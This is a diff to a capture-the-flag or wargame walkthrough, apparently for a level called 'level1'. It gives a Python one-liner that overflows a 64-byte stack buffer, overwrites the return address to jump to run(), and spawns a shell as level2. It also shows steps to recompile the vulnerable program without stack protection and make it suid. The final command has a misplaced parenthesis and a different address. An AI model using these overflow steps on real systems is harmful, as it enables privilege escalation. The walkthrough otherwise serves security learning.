@@ -19,11 +19,11 @@ space from esp alignment		(8 bytes)
 old ebp							(4 bytes)
 buffer							(64 bytes)
 
-# We overflow the buffer overwrite the return address with 0x08048444, reversed for little-endian.
+# We overflow the buffer and overwrite the return address with 0x08048444, reversed for little-endian.
 # We trick the program to stay open with cat listening on stdin.
 (python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])"; cat) | ~/level1
 
-# We redirected the program to call run() and spawn a shell, in which the user is level2
+# We redirected the program to call run() and spawn a shell, in which the effective uid is level2
 whoami
 
 # Read the password for user level2
@@ -40,19 +40,23 @@ su level2
 
 
 # ------------------------------------------------------------------------
-# Recreate the exploitable binary
+# Recreate the exploitable program
 # ------------------------------------------------------------------------
 
-# As user level2, compile the exploit in /tmp
-gcc source.c -fno-stack-protector
+# As user level2:
 
-# Edit suid
-chmod u+s a.out
+	# Compile the program in /tmp
+	gcc source1.c -fno-stack-protector -o ft_level1
 
-# Move the exploit to level2 home directory
-chmod +wx ~; mv a.out ~
+	# Edit suid
+	chmod u+s ft_level1
 
-# Now user level1 can run the exploit
-(python -c "print('A' * 76) + '\x08\x04\x84\x64'[::-1]"; cat) | /home/user/level2/a.out
+	# Move the program to home directory
+	chmod +wx ~; mv ft_level1 ~
+
+# As user level1:
+
+	# Run the program
+	(python -c "print('A' * 76) + '\x08\x04\x84\x64'[::-1]"; cat) | /home/user/level2/ft_level1
 
 
